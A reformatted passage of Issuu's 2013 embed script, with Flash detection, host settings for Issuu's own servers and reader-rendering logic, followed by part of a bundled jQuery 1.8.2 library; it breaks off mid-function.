/*! ISSUU Embed - v0.1.0 - 2013-08-15
Property of ISSUU: issuu.com  */
(function (e, t, n) {
    function i() {
        function n(e) {
            return e = e.match(/[\d]+/g), e.length = 3, e.join(".")
        }
        var e = !1,
            t = "";
        if (navigator.plugins && navigator.plugins.length) {
            var r = navigator.plugins["Shockwave Flash"];
            r && (e = !0, r.description && (t = n(r.description))), navigator.plugins["Shockwave Flash 2.0"] && (e = !0, t = "2.0.0.11")
        } else if (navigator.mimeTypes && navigator.mimeTypes.length) {
            var i = navigator.mimeTypes["application/x-shockwave-flash"];
            (e = i && i.enabledPlugin) && (t = n(i.enabledPlugin.description))
        } else try {
            var s = new ActiveXObject("ShockwaveFlash.ShockwaveFlash.7"),
                e = !0,
                t = n(s.GetVariable("$version"))
        } catch (o) {
            try {
                s = new ActiveXObject("ShockwaveFlash.ShockwaveFlash.6"), e = !0, t = "6.0.21"
            } catch (u) {
                try {
                    s = new ActiveXObject("ShockwaveFlash.ShockwaveFlash"), e = !0, t = n(s.GetVariable("$version"))
                } catch (a) {}
            }
        }
        return {
            hasFlash: function () {
                return e
            },
            getVersion: function () {
                return t
            },
            isGoodForIssuu: function () {
                var e = t.split(".");
                return parseInt(e[0], 10) >= 9
            }
        }
    }

    function s(e) {
        return e ? {
            pingbackProto: "https://",
            pingbackHost: "pingback.issuu.com/",
            staticProto: "https://",
            staticHost: "secure-static.issuu.com/",
            configProto: "https://",
            configHost: "secure-embed.issuu.com/",
            configPath: "",
            imgProto: "https://",
            imgHost: "image.issuu.com/"
        } : {
            pingbackProto: "http://",
            pingbackHost: "pingback.issuu.com/",
            staticProto: "http://",
            staticHost: "static.issuu.com/",
            configProto: "http://",
            configHost: "embed.issuu.com/",
            configPath: "",
            imgProto: "http://",
            imgHost: "image.issuu.com/"
        }
    }

    function g() {
        return m
    }

    function y(e) {
        var t = /^([0-9]{1,8})\/([0-9]{1,8}).*$/,
            n = t.exec(e);
        return n && n.length > 2 ? n[1] + "/" + n[2] : c
    }

    function b() {
        var e = 0;
        return d.each(g(), function (t) {
            e += g()[t].elements.length
        }), e
    }

    function w(e) {
        "use strict";
        var t;
        try {
            t = d(e)
        } catch (n) {
            return
        }
        t.each(function (e, t) {
            var n = y(d(t).attr(l));
            g()[n] ? d.inArray(t, g()[n].elements) > -1 || g()[n].elements.push(t) : g()[n] = {
                loading: !1,
                template: null,
                elements: [t]
            }
        })
    }

    function E(e) {
        var t = y(e);
        t === c ? w(e) : w("[" + l + "=" + t + " ]")
    }

    function S() {
        d.each(g(), function (e) {
            x(e)
        })
    }

    function x(e) {
        if (!g().hasOwnProperty(e)) return;
        if (g()[e].loading) return;
        g()[e].template ? T(e) : (g()[e].loading = !0, M.load(e, function (t) {
            g()[e].config = t, g()[e].template = a.get(), g()[e].loading = !1, T(e)
        }, function () {
            g()[e].template = a.get(a.type.ERROR), g()[e].loading = !1, T(e)
        }))
    }

    function T(e) {
        var t = g()[e].template,
            n = g()[e].config;
        d.each(g()[e].elements, function (r, i) {
            if (d(i).hasClass(p)) return;
            d(i).addClass(p), t.render(i, n, e, function () {
                ++v >= b() && N()
            })
        })
    }

    function N() {
        "use strict";
        if (e.IssuuReaders.loaded) return;
        e.IssuuReaders.loaded = !0, typeof e.onIssuuReadersLoaded == "function" && e.onIssuuReadersLoaded.call({}, e.IssuuReaders)
    }

    function C(e) {
        "use strict";
        return g().hasOwnProperty(e) && g()[e].template ? g()[e].template.getReader(g()[e].elements[0]) : null
    }

    function k(e) {
        "use strict";
        var t;
        try {
            t = d(e)
        } catch (n) {}
        if (t && t.length > 0) {
            var r = t.attr(l);
            if (g().hasOwnProperty(r) && g()[r].template) return g()[r].template.getReader(t)
        }
        return null
    }

    function L(e) {
        var t = C(e);
        return t !== null ? t : k(e)
    }

    function A(e) {
        e === n ? w(h) : E(e), S()
    }
    var r = "0.1.0-20130815";
    (function (e, t) {
        function _(e) {
            var t = M[e] = {};
            return v.each(e.split(y), function (e, n) {
                t[n] = !0
            }), t
        }

        function H(e, n, r) {
            if (r === t && e.nodeType === 1) {
                var i = "data-" + n.replace(P, "-$1").toLowerCase();
                r = e.getAttribute(i);
                if (typeof r == "string") {
                    try {
                        r = r === "true" ? !0 : r === "false" ? !1 : r === "null" ? null : +r + "" === r ? +r : D.test(r) ? v.parseJSON(r) : r
                    } catch (s) {}
                    v.data(e, n, r)
                } else r = t
            }
            return r
        }

        function B(e) {
            var t;
            for (t in e) {
                if (t === "data" && v.isEmptyObject(e[t])) continue;
                if (t !== "toJSON") return !1
            }
            return !0
        }

        function et() {
            return !1
        }

        function tt() {
            return !0
        }

        function ut(e) {
            return !e || !e.parentNode || e.parentNode.nodeType === 11
        }

        function at(e, t) {
            do e = e[t]; while (e && e.nodeType !== 1);
            return e
        }

        function ft(e, t, n) {
            t = t || 0;
            if (v.isFunction(t)) return v.grep(e, function (e, r) {
                var i = !! t.call(e, r, e);
                return i === n
            });
            if (t.nodeType) return v.grep(e, function (e, r) {
                return e === t === n
            });
            if (typeof t == "string") {
                var r = v.grep(e, function (e) {
                    return e.nodeType === 1
                });
                if (it.test(t)) return v.filter(t, r, !n);
                t = v.filter(t, r)
            }
            return v.grep(e, function (e, r) {
                return v.inArray(e, t) >= 0 === n
            })
        }

        function lt(e) {
            var t = ct.split("|"),
                n = e.createDocumentFragment();
            if (n.createElement)
                while (t.length) n.createElement(t.pop());
            return n
        }

        function Lt(e, t) {
            return e.getElementsByTagName(t)[0] || e.appendChild(e.ownerDocument.createElement(t))
        }

        function At(e, t) {
            if (t.nodeType !== 1 || !v.hasData(e)) return;
            var n, r, i, s = v._data(e),
                o = v._data(t, s),
                u = s.events;
            if (u) {
                delete o.handle, o.events = {};
                for (n in u)
                    for (r = 0, i = u[n].length; r < i; r++) v.event.add(t, n, u[n][r])
            }
            o.data && (o.data = v.extend({}, o.data))
        }

        function Ot(e, t) {
            var n;
            if (t.nodeType !== 1) return;
            t.clearAttributes && t.clearAttributes(), t.mergeAttributes && t.mergeAttributes(e), n = t.nodeName.toLowerCase(), n === "object" ? (t.parentNode && (t.outerHTML = e.outerHTML), v.support.html5Clone && e.innerHTML && !v.trim(t.innerHTML) && (t.innerHTML = e.innerHTML)) : n === "input" && Et.test(e.type) ? (t.defaultChecked = t.checked = e.checked, t.value !== e.value && (t.value = e.value)) : n === "option" ? t.selected = e.defaultSelected : n === "input" || n === "textarea" ? t.defaultValue = e.defaultValue : n === "script" && t.text !== e.text && (t.text = e.text), t.removeAttribute(v.expando)
        }

        function Mt(e) {
            return typeof e.getElementsByTagName != "undefined" ? e.getElementsByTagName("*") : typeof e.querySelectorAll != "undefined" ? e.querySelectorAll("*") : []
        }

        function _t(e) {
            Et.test(e.type) && (e.defaultChecked = e.checked)
        }

        function Qt(e, t) {
            if (t in e) return t;
            var n = t.charAt(0).toUpperCase() + t.slice(1),
                r = t,
                i = Jt.length;
            while (i--) {
                t = Jt[i] + n;
                if (t in e) return t
            }
            return r
        }

        function Gt(e, t) {
            return e = t || e, v.css(e, "display") === "none" || !v.contains(e.ownerDocument, e)
        }

        function Yt(e, t) {
            var n, r, i = [],
                s = 0,
                o = e.length;
            for (; s < o; s++) {
                n = e[s];
                if (!n.style) continue;
                i[s] = v._data(n, "olddisplay"), t ? (!i[s] && n.style.display === "none" && (n.style.display = ""), n.style.display === "" && Gt(n) && (i[s] = v._data(n, "olddisplay", nn(n.nodeName)))) : (r = Dt(n, "display"), !i[s] && r !== "none" && v._data(n, "olddisplay", r))
            }
            for (s = 0; s < o; s++) {
                n = e[s];
                if (!n.style) continue;
                if (!t || n.style.display === "none" || n.style.display === "") n.style.display = t ? i[s] || "" : "none"
            }
            return e
        }

        function Zt(e, t, n) {
            var r = Rt.exec(t);
            return r ? Math.max(0, r[1] - (n || 0)) + (r[2] || "px") : t
        }

        function en(e, t, n, r) {
            var i = n === (r ? "border" : "content") ? 4 : t === "width" ? 1 : 0,
                s = 0;
            for (; i < 4; i += 2) n === "margin" && (s += v.css(e, n + $t[i], !0)), r ? (n === "content" && (s -= parseFloat(Dt(e, "padding" + $t[i])) || 0), n !== "margin" && (s -= parseFloat(Dt(e, "border" + $t[i] + "Width")) || 0)) : (s += parseFloat(Dt(e, "padding" + $t[i])) || 0, n !== "padding" && (s += parseFloat(Dt(e, "border" + $t[i] + "Width")) || 0));
            return s
        }

        function tn(e, t, n) {
            var r = t === "width" ? e.offsetWidth : e.offsetHeight,
                i = !0,
                s = v.support.boxSizing && v.css(e, "boxSizing") === "border-box";
            if (r <= 0 || r == null) {
                r = Dt(e, t);
                if (r < 0 || r == null) r = e.style[t];
                if (Ut.test(r)) return r;
                i = s && (v.support.boxSizingReliable || r === e.style[t]), r = parseFloat(r) || 0
            }
            return r + en(e, t, n || (s ? "border" : "content"), i) + "px"
        }

        function nn(e) {
            if (Wt[e]) return Wt[e];
            var t = v("<" + e + ">").appendTo(i.body),
                n = t.css("display");
            t.remove();
            if (n === "none" || n === "") {
                Pt = i.body.appendChild(Pt || v.extend(i.createElement("iframe"), {
                    frameBorder: 0,
                    width: 0,
                    height: 0
                }));
                if (!Ht || !Pt.createElement) Ht = (Pt.contentWindow || Pt.contentDocument).document, Ht.write("<!doctype html><html><body>"), Ht.close();
                t = Ht.body.appendChild(Ht.createElement(e)), n = Dt(t, "display"), i.body.removeChild(Pt)
            }
            return Wt[e] = n, n
        }

        function fn(e, t, n, r) {
            var i;
            if (v.isArray(t)) v.each(t, function (t, i) {
                n || sn.test(e) ? r(e, i) : fn(e + "[" + (typeof i == "object" ? t : "") + "]", i, n, r)
            });
            else if (!n && v.type(t) === "object")
                for (i in t) fn(e + "[" + i + "]", t[i], n, r);
            else r(e, t)
        }

        function Cn(e) {
            return function (t, n) {
                typeof t != "string" && (n = t, t = "*");
                var r, i, s, o = t.toLowerCase().split(y),
                    u = 0,
                    a = o.length;
                if (v.isFunction(n))
                    for (; u < a; u++) r = o[u], s = /^\+/.test(r), s && (r = r.substr(1) || "*"), i = e[r] = e[r] || [], i[s ? "unshift" : "push"](n)
            }
        }

        function kn(e, n, r, i, s, o) {
            s = s || n.dataTypes[0], o = o || {}, o[s] = !0;
            var u, a = e[s],
                f = 0,
                l = a ? a.length : 0,
                c = e === Sn;
            for (; f < l && (c || !u); f++) u = a[f](n, r, i), typeof u == "string" && (!c || o[u] ? u = t : (n.dataTypes.unshift(u), u = kn(e, n, r, i, u, o)));
            return (c || !u) && !o["*"] && (u = kn(e, n, r, i, "*", o)), u
        }

        function Ln(e, n) {
            var r, i, s = v.ajaxSettings.flatOptions || {};
            for (r in n) n[r] !== t && ((s[r] ? e : i || (i = {}))[r] = n[r]);
            i && v.extend(!0, e, i)
        }

        function An(e, n, r) {
            var i, s, o, u, a = e.contents,
                f = e.dataTypes,
                l = e.responseFields;
            for (s in l) s in r && (n[l[s]] = r[s]);
            while (f[0] === "*") f.shift(), i === t && (i = e.mimeType || n.getResponseHeader("content-type"));
            if (i)
                for (s in a)
                    if (a[s] && a[s].test(i)) {
                        f.unshift(s);
                        break
                    }
            if (f[0] in r) o = f[0];
            else {
                for (s in r) {
                    if (!f[0] || e.converters[s + " " + f[0]]) {
                        o = s;
                        break
                    }
                    u || (u = s)
                }
                o = o || u
            } if (o) return o !== f[0] && f.unshift(o), r[o]
        }

        function On(e, t) {
            var n, r, i, s, o = e.dataTypes.slice(),
                u = o[0],
                a = {}, f = 0;
            e.dataFilter && (t = e.dataFilter(t, e.dataType));
            if (o[1])
                for (n in e.converters) a[n.toLowerCase()] = e.converters[n];
            for (; i = o[++f];)
                if (i !== "*") {
                    if (u !== "*" && u !== i) {
                        n = a[u + " " + i] || a["* " + i];
                        if (!n)
                            for (r in a) {
                                s = r.split(" ");
                                if (s[1] === i) {
                                    n = a[u + " " + s[0]] || a["* " + s[0]];
                                    if (n) {
                                        n === !0 ? n = a[r] : a[r] !== !0 && (i = s[0], o.splice(f--, 0, i));
                                        break
                                    }
                                }
                            }
                        if (n !== !0)
                            if (n && e["throws"]) t = n(t);
                            else try {
                                t = n(t)
                            } catch (l) {
                                return {
                                    state: "parsererror",
                                    error: n ? l : "No conversion from " + u + " to " + i
                                }
                            }
                    }
                    u = i
                }
            return {
                state: "success",
                data: t
            }
        }

        function Fn() {
            try {
                return new e.XMLHttpRequest
            } catch (t) {}
        }

        function In() {
            try {
                return new e.ActiveXObject("Microsoft.XMLHTTP")
            } catch (t) {}
        }

        function $n() {
            return setTimeout(function () {
                qn = t
            }, 0), qn = v.now()
        }

        function Jn(e, t) {
            v.each(t, function (t, n) {
                var r = (Vn[t] || []).concat(Vn["*"]),
                    i = 0,
                    s = r.length;
                for (; i < s; i++)
                    if (r[i].call(e, t, n)) return
            })
        }

        function Kn(e, t, n) {
            var r, i = 0,
                s = 0,
                o = Xn.length,
                u = v.Deferred().always(function () {
                    delete a.elem
                }),
                a = function () {
                    var t = qn || $n(),
                        n = Math.max(0, f.startTime + f.duration - t),
                        r = 1 - (n / f.duration || 0),
                        i = 0,
                        s = f.tweens.length;
                    for (; i < s; i++) f.tweens[i].run(r);
                    return u.notifyWith(e, [f, r, n]), r < 1 && s ? n : (u.resolveWith(e, [f]), !1)
                }, f = u.promise({
                    elem: e,
                    props: v.extend({}, t),
                    opts: v.extend(!0, {
                        specialEasing: {}
                    }, n),
                    originalProperties: t,
                    originalOptions: n,
                    startTime: qn || $n(),
                    duration: n.duration,
                    tweens: [],
                    createTween: function (t, n, r) {
                        var i = v.Tween(e, f.opts, t, n, f.opts.specialEasing[t] || f.opts.easing);
                        return f.tweens.push(i), i
                    },
                    stop: function (t) {
                        var n = 0,
                            r = t ? f.tweens.length : 0;
                        for (; n < r; n++) f.tweens[n].run(1);
                        return t ? u.resolveWith(e, [f, t]) : u.rejectWith(e, [f, t]), this
                    }
                }),
                l = f.props;
            Qn(l, f.opts.specialEasing);
            for (; i < o; i++) {
                r = Xn[i].call(f, e, l, f.opts);
                if (r) return r
            }
            return Jn(f, l), v.isFunction(f.opts.start) && f.opts.start.call(e, f), v.fx.timer(v.extend(a, {
                anim: f,
                queue: f.opts.queue,
                elem: e
            })), f.progress(f.opts.progress).done(f.opts.done, f.opts.complete).fail(f.opts.fail).always(f.opts.always)
        }

        function Qn(e, t) {
            var n, r, i, s, o;
            for (n in e) {
                r = v.camelCase(n), i = t[r], s = e[n], v.isArray(s) && (i = s[1], s = e[n] = s[0]), n !== r && (e[r] = s, delete e[n]), o = v.cssHooks[r];
                if (o && "expand" in o) {
                    s = o.expand(s), delete e[r];
                    for (n in s) n in e || (e[n] = s[n], t[n] = i)
                } else t[r] = i
            }
        }

        function Gn(e, t, n) {
            var r, i, s, o, u, a, f, l, c = this,
                h = e.style,
                p = {}, d = [],
                m = e.nodeType && Gt(e);
            n.queue || (f = v._queueHooks(e, "fx"), f.unqueued == null && (f.unqueued = 0, l = f.empty.fire, f.empty.fire = function () {
                f.unqueued || l()
            }), f.unqueued++, c.always(function () {
                c.always(function () {
                    f.unqueued--, v.queue(e, "fx").length || f.empty.fire()
                })
            })), e.nodeType === 1 && ("height" in t || "width" in t) && (n.overflow = [h.overflow, h.overflowX, h.overflowY], v.css(e, "display") === "inline" && v.css(e, "float") === "none" && (!v.support.inlineBlockNeedsLayout || nn(e.nodeName) === "inline" ? h.display = "inline-block" : h.zoom = 1)), n.overflow && (h.overflow = "hidden", v.support.shrinkWrapBlocks || c.done(function () {
                h.overflow = n.overflow[0], h.overflowX = n.overflow[1], h.overflowY = n.overflow[2]
            }));
            for (r in t) {
                s = t[r];
                if (Un.exec(s)) {
                    delete t[r];
                    if (s === (m ? "hide" : "show")) continue;
                    d.push(r)
                }
            }
            o = d.length;
            if (o) {
                u = v._data(e, "fxshow") || v._data(e, "fxshow", {}), m ? v(e).show() : c.done(function () {
                    v(e).hide()
                }), c.done(function () {
                    var t;
                    v.removeData(e, "fxshow", !0);
                    for (t in p) v.style(e, t, p[t])
                });
                for (r = 0; r < o; r++) i = d[r], a = c.createTween(i, m ? u[i] : 0), p[i] = u[i] || v.style(e, i), i in u || (u[i] = a.start, m && (a.end = a.start, a.start = i === "width" || i === "height" ? 1 : 0))
            }
        }

        function Yn(e, t, n, r, i) {
            return new Yn.prototype.init(e, t, n, r, i)
        }

        function Zn(e, t) {
            var n, r = {
                    height: e
                }, i = 0;
            t = t ? 1 : 0;
            for (; i < 4; i += 2 - t) n = $t[i], r["margin" + n] = r["padding" + n] = e;
            return t && (r.opacity = r.width = e), r
        }

        function tr(e) {
            return v.isWindow(e) ? e : e.nodeType === 9 ? e.defaultView || e.parentWindow : !1
        }
        var n, r, i = e.document,
            s = e.location,
            o = e.navigator,
            u = e.jQuery,
            a = e.$,
            f = Array.prototype.push,
            l = Array.prototype.slice,
            c = Array.prototype.indexOf,
            h = Object.prototype.toString,
            p = Object.prototype.hasOwnProperty,
            d = String.prototype.trim,
            v = function (e, t) {
                return new v.fn.init(e, t, n)
            }, m = /[\-+]?(?:\d*\.|)\d+(?:[eE][\-+]?\d+|)/.source,
            g = /\S/,
            y = /\s+/,
            b = /^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g,
            w = /^(?:[^#<]*(<[\w\W]+>)[^>]*$|#([\w\-]*)$)/,
            E = /^<(\w+)\s*\/?>(?:<\/\1>|)$/,
            S = /^[\],:{}\s]*$/,
            x = /(?:^|:|,)(?:\s*\[)+/g,
            T = /\\(?:["\\\/bfnrt]|u[\da-fA-F]{4})/g,
            N = /"[^"\\\r\n]*"|true|false|null|-?(?:\d\d*\.|)\d+(?:[eE][\-+]?\d+|)/g,
            C = /^-ms-/,
            k = /-([\da-z])/gi,
            L = function (e, t) {
                return (t + "").toUpperCase()
            }, A = function () {
                i.addEventListener ? (i.removeEventListener("DOMContentLoaded", A, !1), v.ready()) : i.readyState === "complete" && (i.detachEvent("onreadystatechange", A), v.ready())
            }, O = {};
        v.fn = v.prototype = {
            constructor: v,
            init: function (e, n, r) {
                var s, o, u, a;
                if (!e) return this;
                if (e.nodeType) return this.context = this[0] = e, this.length = 1, this;
                if (typeof e == "string") {
                    e.charAt(0) === "<" && e.charAt(e.length - 1) === ">" && e.length >= 3 ? s = [null, e, null] : s = w.exec(e);
                    if (s && (s[1] || !n)) {
                        if (s[1]) return n = n instanceof v ? n[0] : n, a = n && n.nodeType ? n.ownerDocument || n : i, e = v.parseHTML(s[1], a, !0), E.test(s[1]) && v.isPlainObject(n) && this.attr.call(e, n, !0), v.merge(this, e);
                        o = i.getElementById(s[2]);
                        if (o && o.parentNode) {
                            if (o.id !== s[2]) return r.find(e);
                            this.length = 1, this[0] = o
                        }
                        return this.context = i, this.selector = e, this
                    }
                    return !n || n.jquery ? (n || r).find(e) : this.constructor(n).find(e)
                }
                return v.isFunction(e) ? r.ready(e) : (e.selector !== t && (this.selector = e.selector, this.context = e.context), v.makeArray(e, this))
            },
            selector: "",
            jquery: "1.8.2",
            length: 0,
            size: function () {
                return this.length
            },
            toArray: function () {
                return l.call(this)
            },
            get: function (e) {
                return e == null ? this.toArray() : e < 0 ? this[this.length + e] : this[e]
            },
            pushStack: function (e, t, n) {
                var r = v.merge(this.constructor(), e);
                return r.prevObject = this, r.context = this.context, t === "find" ? r.selector = this.selector + (this.selector ? " " : "") + n : t && (r.selector = this.selector + "." + t + "(" + n + ")"), r
            },
            each: function (e, t) {
                return v.each(this, e, t)
            },
            ready: function (e) {
                return v.ready.promise().done(e), this
            },
            eq: function (e) {
                return e = +e, e === -1 ? this.slice(e) : this.slice(e, e + 1)
            },
            first: function () {
                return this.eq(0)
            },
            last: function () {
                return this.eq(-1)
            },
            slice: function () {
                return this.pushStack(l.apply(this, arguments), "slice", l.call(arguments).join(","))
            },
            map: function (e) {
                return this.pushStack(v.map(this, function (t, n) {
                    return e.call(t, n, t)
                }))
            },
            end: function () {
                return this.prevObject || this.constructor(null)
            },
            push: f,
            sort: [].sort,
            splice: [].splice
        }, v.fn.init.prototype = v.fn, v.extend = v.fn.extend = function () {
            var e, n, r, i, s, o, u = arguments[0] || {}, a = 1,
                f = arguments.length,
                l = !1;
            typeof u == "boolean" && (l = u, u = arguments[1] || {}, a = 2), typeof u != "object" && !v.isFunction(u) && (u = {}), f === a && (u = this, --a);
            for (; a < f; a++)
                if ((e = arguments[a]) != null)
                    for (n in e) {
                        r = u[n], i = e[n];
                        if (u === i) continue;
                        l && i && (v.isPlainObject(i) || (s = v.isArray(i))) ? (s ? (s = !1, o = r && v.isArray(r) ? r : []) : o = r && v.isPlainObject(r) ? r : {}, u[n] = v.extend(l, o, i)) : i !== t && (u[n] = i)
                    }
                return u
        }, v.extend({
            noConflict: function (t) {
                return e.$ === v && (e.$ = a), t && e.jQuery === v && (e.jQuery = u), v
            },
            isReady: !1,
            readyWait: 1,
            holdReady: function (e) {
                e ? v.readyWait++ : v.ready(!0)
            },
            ready: function (e) {
                if (e === !0 ? --v.readyWait : v.isReady) return;
                if (!i.body) return setTimeout(v.ready, 1);
                v.isReady = !0;
                if (e !== !0 && --v.readyWait > 0) return;
                r.resolveWith(i, [v]), v.fn.trigger && v(i).trigger("ready").off("ready")
            },
            isFunction: function (e) {
                return v.type(e) === "function"
            },
            isArray: Array.isArray || function (e) {
                return v.type(e) === "array"
            },
            isWindow: function (e) {
                return e != null && e == e.window
            },
            isNumeric: function (e) {
                return !isNaN(parseFloat(e)) && isFinite(e)
            },
            type: function (e) {
                return e == null ? String(e) : O[h.call(e)] || "object"
            },
            isPlainObject: function (e) {
                if (!e || v.type(e) !== "object" || e.nodeType || v.isWindow(e)) return !1;
                try {
                    if (e.constructor && !p.call(e, "constructor") && !p.call(e.constructor.prototype, "isPrototypeOf")) return !1
                } catch (n) {
                    return !1
                }
                var r;
                for (r in e);
                return r === t || p.call(e, r)
            },
            isEmptyObject: function (e) {
                var t;
                for (t in e) return !1;
                return !0
            },
            error: function (e) {
                throw new Error(e)
            },
            parseHTML: function (e, t, n) {
                var r;
                return !e || typeof e != "string" ? null : (typeof t == "boolean" && (n = t, t = 0), t = t || i, (r = E.exec(e)) ? [t.createElement(r[1])] : (r = v.buildFragment([e], t, n ? null : []), v.merge([], (r.cacheable ? v.clone(r.fragment) : r.fragment).childNodes)))
            },
            parseJSON: function (t) {
                if (!t || typeof t != "string") return null;
                t = v.trim(t);
                if (e.JSON && e.JSON.parse) return e.JSON.parse(t);
                if (S.test(t.replace(T, "@").replace(N, "]").replace(x, ""))) return (new Function("return " + t))();
                v.error("Invalid JSON: " + t)
            },
            parseXML: function (n) {
                var r, i;
                if (!n || typeof n != "string") return null;
                try {
                    e.DOMParser ? (i = new DOMParser, r = i.parseFromString(n, "text/xml")) : (r = new ActiveXObject("Microsoft.XMLDOM"), r.async = "false", r.loadXML(n))
                } catch (s) {
                    r = t
                }
                return (!r || !r.documentElement || r.getElementsByTagName("parsererror").length) && v.error("Invalid XML: " + n), r
            },
            noop: function () {},
            globalEval: function (t) {
                t && g.test(t) && (e.execScript || function (t) {
                    e.eval.call(e, t)
                })(t)
            },
            camelCase: function (e) {
                return e.replace(C, "ms-").replace(k, L)
            },
            nodeName: function (e, t) {
                return e.nodeName && e.nodeName.toLowerCase() === t.toLowerCase()
            },
            each: function (e, n, r) {
                var i, s = 0,
                    o = e.length,
                    u = o === t || v.isFunction(e);
                if (r) {
                    if (u) {
                        for (i in e)
                            if (n.apply(e[i], r) === !1) break
                    } else
                        for (; s < o;)
                            if (n.apply(e[s++], r) === !1) break
                } else if (u) {
                    for (i in e)
                        if (n.call(e[i], i, e[i]) === !1) break
                } else
                    for (; s < o;)
                        if (n.call(e[s], s, e[s++]) === !1) break; return e
            },
            trim: d && !d.call("﻿ ") ? function (e) {
                return e == null ? "" : d.call(e)
            } : function (e) {
                return e == null ? "" : (e + "").replace(b, "")
            },
            makeArray: function (e, t) {
                var n, r = t || [];
                return e != null && (n = v.type(e), e.length == null || n === "string" || n === "function" || n === "regexp" || v.isWindow(e) ? f.call(r, e) : v.merge(r, e)), r
            },
            inArray: function (e, t, n) {
                var r;
                if (t) {
                    if (c) return c.call(t, e, n);
                    r = t.length, n = n ? n < 0 ? Math.max(0, r + n) : n : 0;
                    for (; n < r; n++)
                        if (n in t && t[n] === e) return n
                }
                return -1
            },
            merge: function (e, n) {
                var r = n.length,
                    i = e.length,
                    s = 0;
                if (typeof r == "number")
                    for (; s < r; s++) e[i++] = n[s];
                else
                    while (n[s] !== t) e[i++] = n[s++];
                return e.length = i, e
            },
            grep: function (e, t, n) {
                var r, i = [],
                    s = 0,
                    o = e.length;
                n = !! n;
                for (; s < o; s++) r = !! t(e[s], s), n !== r && i.push(e[s]);
                return i
            },
            map: function (e, n, r) {
                var i, s, o = [],
                    u = 0,
                    a = e.length,
                    f = e instanceof v || a !== t && typeof a == "number" && (a > 0 && e[0] && e[a - 1] || a === 0 || v.isArray(e));
                if (f)
                    for (; u < a; u++) i = n(e[u], u, r), i != null && (o[o.length] = i);
                else
                    for (s in e) i = n(e[s], s, r), i != null && (o[o.length] = i);
                return o.concat.apply([], o)
            },
            guid: 1,
            proxy: function (e, n) {
                var r, i, s;
                return typeof n == "string" && (r = e[n], n = e, e = r), v.isFunction(e) ? (i = l.call(arguments, 2), s = function () {
                    return e.apply(n, i.concat(l.call(arguments)))
                }, s.guid = e.guid = e.guid || v.guid++, s) : t
            },
            access: function (e, n, r, i, s, o, u) {
                var a, f = r == null,
                    l = 0,
                    c = e.length;
                if (r && typeof r == "object") {
                    for (l in r) v.access(e, n, l, r[l], 1, o, i);
                    s = 1
                } else if (i !== t) {
                    a = u === t && v.isFunction(i), f && (a ? (a = n, n = function (e, t, n) {
                        return a.call(v(e), n)
                    }) : (n.call(e, i), n = null));
                    if (n)
                        for (; l < c; l++) n(e[l], r, a ? i.call(e[l], l, n(e[l], r)) : i, u);
                    s = 1
                }
                return s ? e : f ? n.call(e) : c ? n(e[0], r) : o
            },
            now: function () {
                return (new Date).getTime()
            }
        }), v.ready.promise = function (t) {
            if (!r) {
                r = v.Deferred();
                if (i.readyState === "complete") setTimeout(v.ready, 1);
                else if (i.addEventListener) i.addEventListener("DOMContentLoaded", A, !1), e.addEventListener("load", v.ready, !1);
                else {
                    i.attachEvent("onreadystatechange", A), e.attachEvent("onload", v.ready);
                    var n = !1;
                    try {
                        n = e.frameElement == null && i.documentElement
                    } catch (s) {}
                    n && n.doScroll && function o() {
                        if (!v.isReady) {
                            try {
                                n.doScroll("left")
                            } catch (e) {
                                return setTimeout(o, 50)
                            }
                            v.ready()
                        }
                    }()
                }
            }
            return r.promise(t)
        }, v.each("Boolean Number String Function Array Date RegExp Object".split(" "), function (e, t) {
            O["[object " + t + "]"] = t.toLowerCase()
        }), n = v(i);
        var M = {};
        v.Callbacks = function (e) {
            e = typeof e == "string" ? M[e] || _(e) : v.extend({}, e);
            var n, r, i, s, o, u, a = [],
                f = !e.once && [],
                l = function (t) {
                    n = e.memory && t, r = !0, u = s || 0, s = 0, o = a.length, i = !0;
                    for (; a && u < o; u++)
                        if (a[u].apply(t[0], t[1]) === !1 && e.stopOnFalse) {
                            n = !1;
                            break
                        }
                    i = !1, a && (f ? f.length && l(f.shift()) : n ? a = [] : c.disable())
                }, c = {
                    add: function () {
                        if (a) {
                            var t = a.length;
                            (function r(t) {
                                v.each(t, function (t, n) {
                                    var i = v.type(n);
                                    i === "function" && (!e.unique || !c.has(n)) ? a.push(n) : n && n.length && i !== "string" && r(n)
                                })
                            })(arguments), i ? o = a.length : n && (s = t, l(n))
                        }
                        return this
                    },
                    remove: function () {
                        return a && v.each(arguments, function (e, t) {
                            var n;
                            while ((n = v.inArray(t, a, n)) > -1) a.splice(n, 1), i && (n <= o && o--, n <= u && u--)
                        }), this
                    },
                    has: function (e) {
                        return v.inArray(e, a) > -1
                    },
                    empty: function () {
                        return a = [], this
                    },
                    disable: function () {
                        return a = f = n = t, this
                    },
                    disabled: function () {
                        return !a
                    },
                    lock: function () {
                        return f = t, n || c.disable(), this
                    },
                    locked: function () {
                        return !f
                    },
                    fireWith: function (e, t) {
                        return t = t || [], t = [e, t.slice ? t.slice() : t], a && (!r || f) && (i ? f.push(t) : l(t)), this
                    },
                    fire: function () {
                        return c.fireWith(this, arguments), this
                    },
                    fired: function () {
                        return !!r
                    }
                };
            return c
        }, v.extend({
            Deferred: function (e) {
                var t = [
                    ["resolve", "done", v.Callbacks("once memory"), "resolved"],
                    ["reject", "fail", v.Callbacks("once memory"), "rejected"],
                    ["notify", "progress", v.Callbacks("memory")]
                ],
                    n = "pending",
                    r = {
                        state: function () {
                            return n
                        },
                        always: function () {
                            return i.done(arguments).fail(arguments), this
                        },
                        then: function () {
                            var e = arguments;
                            return v.Deferred(function (n) {
                                v.each(t, function (t, r) {
                                    var s = r[0],
                                        o = e[t];
                                    i[r[1]](v.isFunction(o) ? function () {
                                        var e = o.apply(this, arguments);
                                        e && v.isFunction(e.promise) ? e.promise().done(n.resolve).fail(n.reject).progress(n.notify) : n[s + "With"](this === i ? n : this, [e])
                                    } : n[s])
                                }), e = null
                            }).promise()
                        },
                        promise: function (e) {
                            return e != null ? v.extend(e, r) : r
                        }
                    }, i = {};
                return r.pipe = r.then, v.each(t, function (e, s) {
                    var o = s[2],
                        u = s[3];
                    r[s[1]] = o.add, u && o.add(function () {
                        n = u
                    }, t[e ^ 1][2].disable, t[2][2].lock), i[s[0]] = o.fire, i[s[0] + "With"] = o.fireWith
                }), r.promise(i), e && e.call(i, i), i
            },
            when: function (e) {
                var t = 0,
                    n = l.call(arguments),
                    r = n.length,
                    i = r !== 1 || e && v.isFunction(e.promise) ? r : 0,
                    s = i === 1 ? e : v.Deferred(),
                    o = function (e, t, n) {
                        return function (r) {
